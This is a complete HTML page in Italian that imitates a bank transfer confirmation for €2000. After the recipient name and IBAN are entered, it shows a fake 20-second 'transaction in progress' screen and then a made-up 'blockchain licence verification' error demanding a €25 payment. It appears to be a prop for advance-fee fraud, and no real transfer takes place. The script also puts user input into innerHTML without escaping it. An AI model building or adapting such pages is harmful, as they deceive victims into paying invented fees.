<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8">
  <title>Conferma Bonifico</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background-color: #f2f2f2;
      margin: 0;
      padding: 0;
      color: #333;
    }
    .screen {
      max-width: 360px;
      margin: 60px auto;
      background: #fff;
      border-radius: 16px;
      box-shadow: 0 0 12px rgba(0,0,0,0.1);
      padding: 24px;
      text-align: center;
    }
    .amount {
      font-size: 32px;
      font-weight: bold;
      margin-bottom: 16px;
      color: #222;
    }
    .recipient {
      font-size: 16px;
      margin-bottom: 8px;
    }
    .iban {
      font-size: 14px;
      color: #555;
      margin-bottom: 24px;
    }
    label {
      display: block;
      text-align: left;
      margin-top: 12px;
      font-weight: bold;
      font-size: 14px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin-top: 6px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 14px;
    }
    .link-btn {
      background-color: #6a1b9a;
      color: #fff;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 12px;
      font-size: 16px;
      margin-top: 24px;
      cursor: pointer;
    }

    /* Modal */
    .modal {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.4);
      justify-content: center;
      align-items: center;
      z-index: 999;
    }
    .modal-content {
      background: #fff;
      padding: 24px;
      border-radius: 16px;
      text-align: center;
      width: 320px;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
    }
    .spinner {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #6a1b9a;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 0 auto 16px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .done-btn {
      background-color: #6a1b9a;
      color: #fff;
      border: none;
      padding: 10px 20px;
      border-radius: 12px;
      font-size: 14px;
      margin-top: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="screen">
    <div class="amount">€2000</div>

    <label for="name">Nome del destinatario</label>
    <input type="text" id="name" placeholder="Es. Piccione Elisa">

    <label for="iban">Numero IBAN</label>
    <input type="text" id="iban" placeholder="Es. IT66 A076 0111 3000 0107 6539 921">

    <button class="link-btn" onclick="startTransaction()">Fatto</button>
  </div>

  <!-- Modal -->
  <div class="modal" id="modal">
    <div class="modal-content" id="modalContent">
      <div class="spinner" id="spinner"></div>
      <p id="modalText">Transazione in corso...</p>
    </div>
  </div>

  <script>
    function startTransaction() {
      const modal = document.getElementById('modal');
      const modalText = document.getElementById('modalText');
      const spinner = document.getElementById('spinner');
      const name = document.getElementById('name').value;
      const iban = document.getElementById('iban').value;

      modal.style.display = 'flex';
      spinner.style.display = 'block';
      modalText.textContent = 'Transazione in corso...';

      setTimeout(() => {
        spinner.style.display = 'none';
        modalText.innerHTML = `
          ❌ Errore: Verifica licenza blockchain fallita<br><br>
          È necessario un pagamento di <strong>€25</strong> per completare la transazione.<br><br>
          Destinatario: <strong>${name}</strong><br>
          IBAN: <code>${iban}</code><br><br>
          <button class="done-btn" onclick="modal.style.display='none'">Fatto</button>
        `;
      }, 20000); // 20 secondi
    }

    window.onclick = function(event) {
      const modal = document.getElementById('modal');
      if (event.target === modal) {
        modal.style.display = 'none';
      }
    }
  </script>
</body>
</html>
